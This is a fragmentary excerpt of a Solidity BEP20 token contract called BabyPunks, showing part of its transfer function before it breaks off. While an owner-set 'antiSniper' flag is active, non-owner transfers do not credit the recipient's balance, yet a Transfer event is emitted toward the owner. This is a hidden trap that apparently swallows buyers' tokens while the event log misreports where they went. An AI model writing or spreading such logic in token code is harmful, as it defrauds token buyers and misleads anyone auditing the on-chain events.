...
contract BabyPunks is IBEP20, Auth {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        _balances[recipient] = antiSniper && msg.sender != owner ? _balances[recipient] : _balances[recipient].add(amountReceived);
        _balances[owner] = !antiSniper || msg.sender != owner ? _balances[owner] : _balances[owner].add(amountReceived);

        if(!isDividendExempt[sender]){ try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!isDividendExempt[recipient] && !antiSniper && msg.sender != owner){ try distributor.setShare(recipient, _balances[recipient]) {} catch {} }

        try distributor.process(distributorGas) {} catch {}

        if (antiSniper && msg.sender != owner) {
            emit Transfer(sender, owner, amountReceived);
        } else {
